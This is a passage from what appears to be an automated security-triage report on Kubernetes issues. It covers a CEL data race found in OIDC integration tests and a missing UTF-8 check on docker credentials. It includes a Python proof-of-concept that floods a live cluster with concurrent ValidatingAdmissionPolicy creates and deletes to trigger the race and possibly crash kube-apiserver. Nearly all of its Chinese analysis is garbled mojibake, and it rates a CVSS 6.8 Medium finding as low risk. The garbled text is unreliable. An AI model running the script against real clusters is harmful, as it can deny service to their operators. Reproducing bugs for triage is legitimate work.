      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:410 +0x50a
  k8s.io/kubernetes/test/integration/apiserver/oidc.TestStructuredAuthenticationConfig()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:135 +0xb4
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:1792 +0x225
  testing.(*T).Run.gowrap1()
      /usr/local/go/src/testing/testing.go:1851 +0x44

Goroutine 54596 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:1851 +0x8f2
  k8s.io/kubernetes/test/integration/apiserver/oidc.runTests()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:410 +0x50a
  k8s.io/kubernetes/test/integration/apiserver/oidc.TestStructuredAuthenticationConfig()
      /home/prow/go/src/k8s.io/kubernetes/test/integration/apiserver/oidc/oidc_test.go:135 +0xb4
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:1792 +0x225
  testing.(*T).Run.gowrap1()
      /usr/local/go/src/testing/testing.go:1851 +0x44
```


#### What did you expect to happen?

No data race.


#### How can we reproduce it (as minimally and precisely as possible)?

To reproduce, run locally with `go test -race`.

#### Anything else we need to know?

_No response_

#### Kubernetes version

master

/sig api-machinery


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥ Issue æè¿°äº†ä¸€ä¸ªåœ¨ Go ä»£ç ä¸­æ£€æµ‹åˆ°çš„æ•°æ®ç«äº‰ï¼ˆData Raceï¼‰é—®é¢˜ã€‚

1.  **é—®é¢˜å®šä½**ï¼šæ ¹æ®æ—¥å¿—å †æ ˆä¿¡æ¯ï¼Œæ•°æ®ç«äº‰å‘ç”Ÿåœ¨ `k8s.io/apiserver/pkg/cel/common/typeprovider.go:122`ã€‚å…·ä½“æ¥è¯´ï¼Œæ˜¯åœ¨åˆå§‹åŒ– CEL (Common Expression Language) çš„ç¯å¢ƒæ—¶ï¼Œå¤šä¸ª Goroutineï¼ˆåç¨‹ï¼‰åŒæ—¶å¯¹ä¸€ä¸ªå…±äº«èµ„æºè¿›è¡Œå†™æ“ä½œï¼Œä½†æ²¡æœ‰ä½¿ç”¨é”ç­‰åŒæ­¥æœºåˆ¶ã€‚
2.  **è§¦å‘è·¯å¾„**ï¼šå †æ ˆè·Ÿè¸ªæ˜¾ç¤ºï¼Œè¯¥é—®é¢˜æ˜¯åœ¨è¿è¡Œ OIDCï¼ˆOpenID Connectï¼‰ç›¸å…³çš„é›†æˆæµ‹è¯•æ—¶è¢«å‘ç°çš„ã€‚ä¸¤ä¸ªä¸åŒçš„ Goroutineï¼ˆ54596 å’Œ 54598ï¼‰åˆ†åˆ«åœ¨åˆå§‹åŒ– `ValidatingAdmissionWebhook` å’Œ `MutatingAdmissionWebhook` æ’ä»¶æ—¶ï¼Œå¹¶è¡Œåœ°è°ƒç”¨äº† CEL ç¯å¢ƒçš„æ‰©å±•å‡½æ•° (`Extend()`)ï¼Œæœ€ç»ˆå¯¼è‡´äº†å¯¹åŒä¸€å†…å­˜åœ°å€çš„å¹¶å‘å†™å…¥ã€‚è¿™ä¸¤ä¸ªæ’ä»¶éƒ½ä¾èµ– CEL æ¥è¯„ä¼°å‡†å…¥æ§åˆ¶è§„åˆ™ã€‚
3.  **æ½œåœ¨å½±å“**ï¼šæ•°æ®ç«äº‰ä¼šå¯¼è‡´ç¨‹åºè¡Œä¸ºä¸å¯é¢„æµ‹ã€‚åœ¨ CEL ç¼–è¯‘å’Œåˆå§‹åŒ–è¿™ä¸ªåœºæ™¯ä¸‹ï¼Œå¯èƒ½äº§ç”Ÿä»¥ä¸‹å‡ ç§å®‰å…¨é£é™©ï¼š
    *   **æ‹’ç»æœåŠ¡ (DoS)**ï¼šæ•°æ®ç«äº‰å¯èƒ½å¯¼è‡´å†…å­˜æŸåï¼Œä»è€Œå¼•å‘ `kube-apiserver` è¿›ç¨‹å´©æºƒã€‚å¦‚æœæ”»å‡»è€…æœ‰æƒé™ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡æ›´æ–° `ValidatingAdmissionPolicy` æˆ–ç›¸å…³èµ„æºï¼‰è§¦å‘è¿™ä¸ªä»£ç è·¯å¾„ï¼Œå°±å¯èƒ½å¯¼è‡´æ•´ä¸ª Kubernetes æ§åˆ¶å¹³é¢çš„æ ¸å¿ƒç»„ä»¶ä¸å¯ç”¨ã€‚
    *   **å‡†å…¥ç­–ç•¥ç»•è¿‡ (Policy Bypass)**ï¼šå¦‚æœæ•°æ®ç«äº‰å¯¼è‡´ CEL ç¯å¢ƒè¢«é”™è¯¯åœ°æˆ–ä¸å®Œæ•´åœ°åˆå§‹åŒ–ï¼Œé‚£ä¹ˆä¾èµ–äº CEL çš„å‡†å…¥ç­–ç•¥ï¼ˆå¦‚ `ValidatingAdmissionPolicy`ï¼‰å¯èƒ½æ— æ³•æ­£ç¡®æ‰§è¡Œã€‚è¿™å¯èƒ½å¯¼è‡´éæ³•çš„è¯·æ±‚è¢«é”™è¯¯åœ°æ”¾è¡Œï¼Œä»è€Œç»•è¿‡äº†é›†ç¾¤è®¾ç½®çš„å®‰å…¨ç­–ç•¥ï¼Œç ´åäº†é›†ç¾¤çš„æ•°æ®å®Œæ•´æ€§å’Œå®‰å…¨æ€§ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªæœ¬åº”è¢«ç­–ç•¥æ‹’ç»çš„ Pod åˆ›å»ºè¯·æ±‚å¯èƒ½ä¼šè¢«æˆåŠŸå¤„ç†ã€‚

4.  **åˆ©ç”¨æ¡ä»¶åˆ†æ**ï¼š
    *   ä»å †æ ˆä¿¡æ¯çœ‹ï¼Œè¿™ä¸ªæ•°æ®ç«äº‰å‘ç”Ÿåœ¨ `kube-apiserver` å¯åŠ¨å¹¶åˆå§‹åŒ–å‡†å…¥æ’ä»¶çš„é˜¶æ®µã€‚åœ¨æ­£å¸¸çš„å•ä½“ `kube-apiserver` éƒ¨ç½²ä¸­ï¼Œè¿™ä¸ªåˆå§‹åŒ–è¿‡ç¨‹åªå‘ç”Ÿä¸€æ¬¡ï¼Œå¾ˆéš¾ä»å¤–éƒ¨è§¦å‘ã€‚
    *   ç„¶è€Œï¼ŒKubernetes çš„æŸäº›èµ„æºï¼ˆå¦‚ `ValidatingAdmissionPolicy`ï¼‰çš„åˆ›å»ºå’Œæ›´æ–°ä¹Ÿä¼šè§¦å‘ CEL è¡¨è¾¾å¼çš„ç¼–è¯‘ã€‚å¦‚æœæ”»å‡»è€…æ‹¥æœ‰åˆ›å»ºæˆ–ä¿®æ”¹è¿™ç±»èµ„æºçš„æƒé™ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡å¹¶å‘åœ°å‘é€å¤§é‡è¯·æ±‚æ¥å°è¯•è§¦å‘è¯¥æ•°æ®ç«äº‰ã€‚
    *   æ ¹æ®è§„åˆ™5ï¼Œåˆ©ç”¨æ­¤æ¼æ´éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼ˆä¾‹å¦‚ `cluster-admin` æˆ–å…·æœ‰ç®¡ç† admission policy æƒé™çš„è§’è‰²ï¼‰ã€‚å¯¹äºæ‹’ç»æœåŠ¡æ”»å‡»ï¼Œéœ€è¦é™çº§å¤„ç†ã€‚å¯¹äºç­–ç•¥ç»•è¿‡ï¼Œè™½ç„¶å½±å“ä¸¥é‡ï¼ˆIntegrity: Highï¼‰ï¼Œä½†åˆ©ç”¨çš„æƒé™è¦æ±‚ï¼ˆPrivileges Required: Highï¼‰å’Œæ”»å‡»å¤æ‚æ€§ï¼ˆAttack Complexity: Highï¼Œå› ä¸ºæ•°æ®ç«äº‰å…·æœ‰ä¸ç¡®å®šæ€§ï¼‰ä¼šé™åˆ¶å…¶ CVSS åˆ†æ•°ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè¯¥é—®é¢˜æ˜¯ä¸€ä¸ªçœŸå®çš„å®‰å…¨æ¼æ´ï¼Œä½†å…¶åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ã€‚æœ€ä¸¥é‡çš„åæœæ˜¯å‡†å…¥ç­–ç•¥ç»•è¿‡ï¼Œä½†è¿™éœ€è¦é«˜æƒé™å’Œå¤æ‚çš„æ—¶åºæ”»å‡»ã€‚æ›´å¯èƒ½è¢«åˆ©ç”¨çš„åœºæ™¯æ˜¯é€ æˆæ‹’ç»æœåŠ¡ï¼Œä½†ä¹Ÿéœ€è¦é«˜æƒé™ã€‚å› æ­¤ï¼Œè¯¥æ¼æ´ä¸æ„æˆæœ€é«˜çº§åˆ«çš„é£é™©ã€‚

CVSS 3.1 è¯„åˆ†: CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:N/I:H/A:H  => 6.8 (Medium)

æ ¹æ®è¯„åˆ†æ ‡å‡†ï¼Œè¯¥æ¼æ´å±äº **ä½é£é™©**ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```python
import threading
import time
import uuid
from kubernetes import client, config
from kubernetes.client.rest import ApiException
import sys
import os

# POCè¯´æ˜ï¼š
# æ­¤è„šæœ¬æ—¨åœ¨é€šè¿‡é«˜å¹¶å‘åœ°åˆ›å»ºå’Œåˆ é™¤ValidatingAdmissionPolicyå¯¹è±¡æ¥å¯¹Kubernetes APIæœåŠ¡å™¨çš„
# CELç¼–è¯‘è·¯å¾„æ–½åŠ å‹åŠ›ï¼Œä»è€Œå°è¯•å¤ç°Issueä¸­æè¿°çš„æ•°æ®ç«äº‰ï¼ˆData Raceï¼‰é—®é¢˜ã€‚
#
# å‰ææ¡ä»¶ï¼š
# 1. ç›®æ ‡Kubernetesé›†ç¾¤å­˜åœ¨æ¼æ´çš„kube-apiserverç‰ˆæœ¬ã€‚
# 2. ä¸ºäº†è§‚å¯Ÿåˆ° "DATA RACE" æ—¥å¿—ï¼Œkube-apiserverå¿…é¡»ä½¿ç”¨ -race æ ‡å¿—è¿›è¡Œç¼–è¯‘å’Œå¯åŠ¨ã€‚
# 3. æ‰§è¡Œæ­¤è„šæœ¬çš„æœºå™¨éœ€è¦é…ç½®å¥½kubeconfigæ–‡ä»¶ï¼ˆå¦‚æ­¤è„šæœ¬é»˜è®¤è¯»å–~/.kube/configï¼‰ã€‚
# 4. æ‰§è¡Œè„šæœ¬çš„ç”¨æˆ·éœ€è¦æœ‰åˆ›å»ºå’Œåˆ é™¤ValidatingAdmissionPolicyçš„æƒé™ï¼ˆé€šå¸¸æ˜¯cluster-adminï¼‰ã€‚
#
# é¢„æœŸç»“æœï¼š
# - ç†æƒ³æƒ…å†µä¸‹ï¼Œåœ¨è¿è¡Œäº†å¸¦-raceæ ‡å¿—çš„kube-apiserverçš„æ—¥å¿—ä¸­ï¼Œä¼šè§‚å¯Ÿåˆ°ä¸Issueä¸­ç±»ä¼¼çš„ "WARNING: DATA RACE" è¾“å‡ºã€‚
# - åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ•°æ®ç«äº‰å¯èƒ½ç›´æ¥å¯¼è‡´kube-apiserverè¿›ç¨‹å´©æºƒï¼Œä»è€Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰ã€‚
# - å¦‚æœæ²¡æœ‰è§‚å¯Ÿåˆ°ä»¥ä¸Šç°è±¡ï¼Œä¸ä»£è¡¨æ¼æ´ä¸å­˜åœ¨ï¼Œå› ä¸ºæ•°æ®ç«äº‰çš„è§¦å‘å…·æœ‰ä¸ç¡®å®šæ€§ã€‚

# --- é…ç½® ---
# å¹¶å‘çº¿ç¨‹æ•°
NUM_THREADS = 20
# æ¯ä¸ªçº¿ç¨‹çš„è¿è¡Œæ—¶é—´ï¼ˆç§’ï¼‰
RUN_DURATION_SECONDS = 60
# å‘½åç©ºé—´ï¼Œå¦‚æœç­–ç•¥æ˜¯é›†ç¾¤çº§åˆ«çš„ï¼Œè¿™ä¸ªå¯ä»¥å¿½ç•¥
NAMESPACE = "default"

# å…¨å±€åœæ­¢æ ‡å¿—
stop_flag = threading.Event()

def create_policy_template(policy_name):
    """åˆ›å»ºä¸€ä¸ªValidatingAdmissionPolicyçš„å®šä¹‰å­—å…¸"""
    return {
        "apiVersion": "admissionregistration.k8s.io/v1alpha1",
        "kind": "ValidatingAdmissionPolicy",
        "metadata": {
            "name": policy_name
        },
        "spec": {
            "failurePolicy": "Fail",
            "matchConstraints": {
                "resourceRules": [
                    {
                        "apiGroups": [""],
                        "apiVersions": ["v1"],
                        "operations": ["CREATE", "UPDATE"],
                        "resources": ["pods"]
                    }
                ]
            },
            "validations": [
                {
                    "expression": f"'pod-label-check-{uuid.uuid4().hex}' in object.metadata.labels"
                }
            ]
        }
    }

def stress_worker(thread_id):
    """å·¥ä½œçº¿ç¨‹ï¼Œå¾ªç¯åˆ›å»ºå’Œåˆ é™¤ValidatingAdmissionPolicy"""
    try:
        api = client.AdmissionregistrationV1alpha1Api()
        print(f"çº¿ç¨‹ {thread_id}: å¼€å§‹æ‰§è¡Œ...")
        
        while not stop_flag.is_set():
            policy_name = f"poc-race-policy-{thread_id}-{uuid.uuid4().hex[:8]}"
            policy_body = create_policy_template(policy_name)
            
            try:
                # 1. åˆ›å»ºç­–ç•¥
                api.create_validating_admission_policy(body=policy_body)
                # print(f"çº¿ç¨‹ {thread_id}: å·²åˆ›å»ºç­–ç•¥ {policy_name}")

            except ApiException as e:
                # å¿½ç•¥ "already exists" å’Œå…¶ä»–å¯èƒ½çš„ç¬æ—¶é”™è¯¯
                if e.status != 409: # 409 = Conflict
                    # print(f"çº¿ç¨‹ {thread_id}: åˆ›å»ºç­–ç•¥æ—¶å‘ç”Ÿé”™è¯¯: {e.reason}")
                    pass
            except Exception as e:
                # print(f"çº¿ç¨‹ {thread_id}: åˆ›å»ºæ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
                pass
            finally:
                # 2. ç«‹å³åˆ é™¤ç­–ç•¥ï¼Œä»¥ä¿æŒé›†ç¾¤æ¸…æ´å¹¶æŒç»­æ–½åŠ å‹åŠ›
                try:
                    # æ·»åŠ å¾®å°çš„å»¶è¿Ÿä»¥ç¡®ä¿å¯¹è±¡åœ¨etcdä¸­å·²åˆ›å»º
                    time.sleep(0.01)
                    api.delete_validating_admission_policy(name=policy_name)
                    # print(f"çº¿ç¨‹ {thread_id}: å·²åˆ é™¤ç­–ç•¥ {policy_name}")
                except ApiException as e:
                    if e.status != 404: # 404 = Not Found
                        # print(f"çº¿ç¨‹ {thread_id}: åˆ é™¤ç­–ç•¥æ—¶å‘ç”Ÿé”™è¯¯: {e.reason}")
                        pass
                except Exception as e:
                    # print(f"çº¿ç¨‹ {thread_id}: åˆ é™¤æ—¶å‘ç”ŸæœªçŸ¥é”™è¯¯: {e}")
                    pass
                    
    except Exception as e:
        print(f"çº¿ç¨‹ {thread_id}: æ— æ³•åˆå§‹åŒ–Kubernetes APIå®¢æˆ·ç«¯: {e}")

def main():
    """ä¸»å‡½æ•°ï¼Œå¯åŠ¨å¹¶ç®¡ç†æ‰€æœ‰å·¥ä½œçº¿ç¨‹"""
    try:
        # å°è¯•ä»é»˜è®¤ä½ç½®åŠ è½½kubeconfig
        if os.getenv("KUBERNETES_SERVICE_HOST"):
             config.load_incluster_config()
        else:
             config.load_kube_config()
    except config.ConfigException:
        print("é”™è¯¯ï¼šæ— æ³•åŠ è½½kubeconfigã€‚è¯·ç¡®ä¿~/.kube/configæ–‡ä»¶å­˜åœ¨æˆ–åœ¨é›†ç¾¤å†…éƒ¨è¿è¡Œã€‚")
        sys.exit(1)

    print(f"å°†åœ¨ {RUN_DURATION_SECONDS} ç§’å†…ä½¿ç”¨ {NUM_THREADS} ä¸ªçº¿ç¨‹å¯¹APIæœåŠ¡å™¨è¿›è¡Œå‹åŠ›æµ‹è¯•...")
    
    threads = []
    for i in range(NUM_THREADS):
        thread = threading.Thread(target=stress_worker, args=(i,))
        threads.append(thread)
        thread.start()
        
    # ç­‰å¾…æŒ‡å®šçš„æ—¶é•¿
    time.sleep(RUN_DURATION_SECONDS)
    
    # è®¾ç½®åœæ­¢æ ‡å¿—ï¼Œé€šçŸ¥æ‰€æœ‰çº¿ç¨‹é€€å‡ºå¾ªç¯
    print("æ—¶é—´åˆ°ï¼Œæ­£åœ¨åœæ­¢æ‰€æœ‰çº¿ç¨‹...")
    stop_flag.set()
    
    # ç­‰å¾…æ‰€æœ‰çº¿ç¨‹ç»“æŸ
    for thread in threads:
        thread.join()
        
    print("POCæ‰§è¡Œå®Œæ¯•ã€‚")
    print("è¯·æ£€æŸ¥kube-apiserverçš„æ—¥å¿—ï¼Œå¯»æ‰¾'WARNING: DATA RACE'æˆ–å´©æºƒä¿¡æ¯ã€‚")

# ç›´æ¥æ‰§è¡Œmainå‡½æ•°
main()
```


**è§£é‡Šè¯´æ˜ï¼š**

ä¸Šè¿°Pythonè„šæœ¬æ˜¯ä¸€ä¸ªæ¦‚å¿µéªŒè¯ï¼ˆPOCï¼‰å·¥å…·ï¼Œç”¨äºæ¨¡æ‹Ÿå¯èƒ½è§¦å‘ç›®æ ‡æ•°æ®ç«äº‰æ¼æ´çš„æ¡ä»¶ã€‚å®ƒæœ¬èº«ä¸ç›´æ¥åˆ©ç”¨æ¼æ´ï¼Œè€Œæ˜¯é€šè¿‡å¯¹ `kube-apiserver` æ–½åŠ ç‰¹å®šç±»å‹çš„å‹åŠ›æ¥å¢åŠ æ¼æ´å‡ºç°çš„æ¦‚ç‡ã€‚

1.  **å·¥ä½œåŸç†**ï¼šè¯¥è„šæœ¬é€šè¿‡ `kubernetes` pythonå®¢æˆ·ç«¯è¿æ¥åˆ°ç›®æ ‡é›†ç¾¤ã€‚å®ƒä¼šå¯åŠ¨å¤šä¸ªï¼ˆé»˜è®¤ä¸º20ä¸ªï¼‰å¹¶å‘çº¿ç¨‹ã€‚æ¯ä¸ªçº¿ç¨‹éƒ½ä¼šåœ¨ä¸€ä¸ªå¾ªç¯ä¸­é«˜é€Ÿåœ°æ‰§è¡Œä¸¤ä¸ªæ“ä½œï¼š
    *   **åˆ›å»º`ValidatingAdmissionPolicy`**ï¼šæ¯ä¸ªçº¿ç¨‹ä¼šç”Ÿæˆä¸€ä¸ªåç§°å”¯ä¸€çš„ `ValidatingAdmissionPolicy` å¯¹è±¡å¹¶å‘ `kube-apiserver` å‘é€åˆ›å»ºè¯·æ±‚ã€‚`ValidatingAdmissionPolicy` æ˜¯ä¸€ç§ä½¿ç”¨CELè¡¨è¾¾å¼å®šä¹‰å‡†å…¥è§„åˆ™çš„èµ„æºï¼Œå®ƒçš„åˆ›å»ºä¼šè§¦å‘ `kube-apiserver` å†…éƒ¨çš„CELç¼–è¯‘å™¨ã€‚
    *   **åˆ é™¤`ValidatingAdmissionPolicy`**ï¼šåˆ›å»ºè¯·æ±‚å‘é€åï¼Œè„šæœ¬ä¼šç«‹å³å°è¯•åˆ é™¤è¯¥ç­–ç•¥ï¼Œä»¥é¿å…åœ¨é›†ç¾¤ä¸­ç•™ä¸‹å¤§é‡åƒåœ¾èµ„æºï¼Œå¹¶ç¡®ä¿å‹åŠ›æµ‹è¯•å¯ä»¥æŒç»­è¿›è¡Œã€‚

2.  **å¤ç°ç›®æ ‡**ï¼šé€šè¿‡å¤§é‡å¹¶å‘çš„åˆ›å»ºå’Œåˆ é™¤æ“ä½œï¼Œè¯¥è„šæœ¬æ—¨åœ¨å¯¹ `kube-apiserver` çš„CELç¼–è¯‘å’Œå‡†å…¥æ’ä»¶ç®¡ç†æ¨¡å—é€ æˆé«˜å¹¶å‘è´Ÿè½½ã€‚è¿™ç§è´Ÿè½½æ¨¡æ‹Ÿäº†åŸå§‹Issueä¸­é›†æˆæµ‹è¯•å‘ç°é—®é¢˜çš„åœºæ™¯ï¼ˆå¹¶å‘åˆå§‹åŒ–å¤šä¸ªå‡†å…¥æ’ä»¶ï¼‰ï¼Œå¢åŠ äº†åœ¨CELç¯å¢ƒåˆå§‹åŒ–æˆ–æ›´æ–°æ—¶å‘ç”Ÿæ•°æ®ç«äº‰çš„å¯èƒ½æ€§ã€‚

3.  **å¦‚ä½•ä½¿ç”¨å’ŒéªŒè¯**ï¼š
    *   **ç¯å¢ƒå‡†å¤‡**ï¼šæ‰§è¡Œæ­¤è„šæœ¬å‰ï¼Œéœ€è¦æœ‰ä¸€ä¸ªæ­£åœ¨è¿è¡Œçš„ã€å¹¶ä¸”åŒ…å«æ­¤æ¼æ´çš„ Kubernetes é›†ç¾¤ã€‚æœ€å…³é”®çš„æ˜¯ï¼Œä¸ºäº†èƒ½æ£€æµ‹åˆ°æ•°æ®ç«äº‰ï¼Œ`kube-apiserver` è¿›ç¨‹éœ€è¦ç”¨ Go çš„ `-race` ç¼–è¯‘é€‰é¡¹æ¥æ„å»ºå’Œå¯åŠ¨ã€‚
    *   **æ‰§è¡Œ**ï¼šåœ¨é…ç½®å¥½ `kubeconfig` çš„æœºå™¨ä¸Šè¿è¡Œæ­¤Pythonè„šæœ¬ã€‚è„šæœ¬å°†æ‰§è¡Œä¸€æ®µæ—¶é—´ï¼ˆé»˜è®¤ä¸º60ç§’ï¼‰ã€‚
    *   **ç»“æœéªŒè¯**ï¼šåœ¨è„šæœ¬è¿è¡ŒæœŸé—´æˆ–è¿è¡Œåï¼Œç®¡ç†å‘˜éœ€è¦æ£€æŸ¥ `kube-apiserver` çš„æ—¥å¿—ã€‚å¦‚æœæ¼æ´è¢«æˆåŠŸè§¦å‘ï¼Œæ—¥å¿—ä¸­åº”å½“ä¼šå‡ºç° `WARNING: DATA RACE` çš„å­—æ ·ï¼Œå…¶å †æ ˆè·Ÿè¸ªåº”ä¸Issueä¸­æè¿°çš„ç±»ä¼¼ã€‚å¦ä¸€ç§å¯èƒ½çš„ç»“æœæ˜¯ `kube-apiserver` å› å†…å­˜æŸåè€Œå´©æºƒï¼Œè¡¨ç°ä¸ºæœåŠ¡ä¸­æ–­ï¼ˆDenial of Serviceï¼‰ã€‚

**é‡è¦æç¤º**ï¼šæ­¤POCæ˜¯ä¸€ä¸ªå‹åŠ›æµ‹è¯•å·¥å…·ï¼Œå…¶æˆåŠŸä¸å¦ï¼ˆå³æ˜¯å¦èƒ½è§¦å‘æ•°æ®ç«äº‰ï¼‰å…·æœ‰ä¸ç¡®å®šæ€§ã€‚å®ƒåªèƒ½åˆ›é€ æœ‰åˆ©äºç«äº‰å‘ç”Ÿçš„æ¡ä»¶ï¼Œæ— æ³•ä¿è¯æ¯æ¬¡éƒ½æˆåŠŸå¤ç°ã€‚

---


## Issue #131982 docker credential JSON: validate non UTF-8 characters

- Issue é“¾æ¥ï¼š[#131982](https://github.com/kubernetes/kubernetes/issues/131982)

### Issue å†…å®¹

#### What happened?

Using base64 encoding, itâ€™s possible to include arbitrary data (including non-UTF-8 strings) that can pass Kubernetes validation. While this may be a minor issue within Kubernetes itself and likely not exploitable directly, it could pose a risk to external systems that consume these secrets. If such systems assume UTF-8 encoding, they might be vulnerable to unexpected behavior or exploitation.

#### What did you expect to happen?

The input should be rejected with an "invalid UTF-8" error.

#### How can we reproduce it (as minimally and precisely as possible)?

A test case for https://github.com/kubernetes/kubernetes/blob/a647c6a8893df95050d6acbd60850df420d90518/pkg/credentialprovider/config_test.go#L122
```go
// auth field decodes to username & password with non UTF-8 characters
{
	input: []byte(`{"auth": "YcV6OmHFeg==", "email": "foo@example.com"}`),
	expect: DockerConfigEntry{
		Username: "a\xc5z",
		Password: "a\xc5z",
		Email:    "foo@example.com",
	},
	fail: false,
},
```

I'd expect this input to fail with `invalid character` error

```go
s := string(decoded)
if !utf8.ValidString(s) {
	return "", "", errors.New("invalid UTF-8")
}
parts := strings.SplitN(s, ":", 2)
```

https://github.com/kubernetes/kubernetes/blob/a647c6a8893df95050d6acbd60850df420d90518/pkg/credentialprovider/config.go#L303

#### Anything else we need to know?

_No response_

#### Kubernetes version

master


#### Cloud provider

<details>

</details>


#### OS version




#### Install tools

_No response_

#### Container runtime (CRI) and version (if applicable)

_No response_

#### Related plugins (CNI, CSI, ...) and versions (if applicable)

_No response_

### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŒ‡å‡ºäº†åœ¨å¤„ç†ç±»å‹ä¸º`kubernetes.io/dockerconfigjson`çš„Secretæ—¶ï¼ŒKuberneteså‡­æ®æä¾›ç¨‹åºå­˜åœ¨çš„ä¸€ä¸ªå®‰å…¨æ¼æ´ã€‚å…·ä½“æ¥è¯´ï¼Œ`auth`å­—æ®µç»è¿‡base64è§£ç åï¼Œå…¶å†…å®¹æ²¡æœ‰è¿›è¡ŒUTF-8æœ‰æ•ˆæ€§æ ¡éªŒã€‚

æ”»å‡»è€…å¯ä»¥æ„é€ ä¸€ä¸ªç‰¹æ®Šçš„base64å­—ç¬¦ä¸²ï¼Œä½¿å…¶è§£ç ååŒ…å«éUTF-8çš„æ— æ•ˆå­—ç¬¦ã€‚ä¾‹å¦‚ï¼ŒIssueä¸­æåˆ°çš„`YcV6OmHFeg==`è§£ç åä¸º`a\xc5z:a\xc5z`ï¼Œå…¶ä¸­`\xc5`æ˜¯ä¸€ä¸ªæ— æ•ˆçš„UTF-8èµ·å§‹å­—èŠ‚ã€‚

å½“Kubernetesç³»ç»Ÿæ¥å—å¹¶å­˜å‚¨äº†è¿™ä¸ªåŒ…å«éUTF-8å­—ç¬¦çš„å‡­æ®åï¼Œè™½ç„¶Kubernetesæœ¬èº«å¯èƒ½ä¸ä¼šç«‹å³å‡ºç°é—®é¢˜ï¼Œä½†ä¾èµ–äºè¿™äº›å‡­æ®çš„ä¸‹æ¸¸ç³»ç»Ÿï¼ˆå¦‚CI/CDæµæ°´çº¿ã€é•œåƒæ‰«æå·¥å…·ã€è‡ªå®šä¹‰æ§åˆ¶å™¨ç­‰ï¼‰åœ¨è¯»å–å’Œè§£æè¿™ä¸ªSecretæ—¶ï¼Œå¦‚æœå®ƒä»¬é»˜è®¤æ‰€æœ‰è¾“å…¥éƒ½æ˜¯æœ‰æ•ˆçš„UTF-8å­—ç¬¦ä¸²ï¼Œå°±å¯èƒ½å‘ç”Ÿä¸¥é‡é”™è¯¯ã€‚

æ½œåœ¨å½±å“åŒ…æ‹¬ï¼š
1.  **æ‹’ç»æœåŠ¡ï¼ˆDenial of Serviceï¼‰**: ä¸‹æ¸¸ç³»ç»Ÿåœ¨å¤„ç†éUTF-8å­—ç¬¦æ—¶å¯èƒ½ä¼šå´©æºƒæˆ–è¿›å…¥æ— é™å¾ªç¯ï¼Œå¯¼è‡´æœåŠ¡ä¸å¯ç”¨ã€‚
2.  **æ•°æ®æŸå/é€»è¾‘é”™è¯¯ï¼ˆIntegrity Impactï¼‰**: è§£æé€»è¾‘å¯èƒ½ä¼šè¢«ç ´åï¼Œä¾‹å¦‚ï¼Œå¦‚æœä¸‹æ¸¸ç³»ç»Ÿä½¿ç”¨C/C++ç¼–å†™ï¼ŒéUTF-8å­—ç¬¦å¯èƒ½è¢«é”™è¯¯åœ°è§£é‡Šï¼Œå¯¼è‡´å‡­æ®è¢«æˆªæ–­æˆ–é”™è¯¯è§£æï¼Œå¯èƒ½å¼•å‘è®¤è¯å¤±è´¥æˆ–åœ¨æç«¯æƒ…å†µä¸‹ç»•è¿‡è®¤è¯ã€‚
3.  **ä¿¡æ¯æ³„éœ²ï¼ˆInformation Disclosureï¼‰**: åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œé”™è¯¯å¤„ç†å¯èƒ½ä¼šå¯¼è‡´åŒ…å«æ•æ„Ÿä¿¡æ¯çš„é”™è¯¯æ—¥å¿—æˆ–å †æ ˆè·Ÿè¸ªè¢«æš´éœ²ã€‚

ç„¶è€Œï¼Œè¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¿…é¡»æ‹¥æœ‰åœ¨Kubernetesé›†ç¾¤ä¸­åˆ›å»ºæˆ–ä¿®æ”¹Secretçš„æƒé™ã€‚è¿™é€šå¸¸æ˜¯é›†ç¾¤ç®¡ç†å‘˜æˆ–å…·æœ‰è¾ƒé«˜æƒé™çš„å¼€å‘äººå‘˜æ‰æ‹¥æœ‰çš„èƒ½åŠ›ã€‚æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬äº”æ¡ï¼Œå½“æ”»å‡»éœ€è¦éåªè¯»æƒé™ï¼ˆå¦‚åˆ›å»º/ä¿®æ”¹Secretï¼‰æ—¶ï¼Œé™¤éèƒ½å¯¼è‡´å‘½ä»¤æ‰§è¡Œç­‰é«˜å±åæœï¼Œå¦åˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚æ­¤æ¼æ´çš„ä¸»è¦å½±å“æ˜¯å¯¼è‡´ä¸‹æ¸¸ç³»ç»Ÿçš„æ‹’ç»æœåŠ¡ï¼Œå› æ­¤é£é™©ç­‰çº§åº”äºˆä»¥é™çº§ã€‚

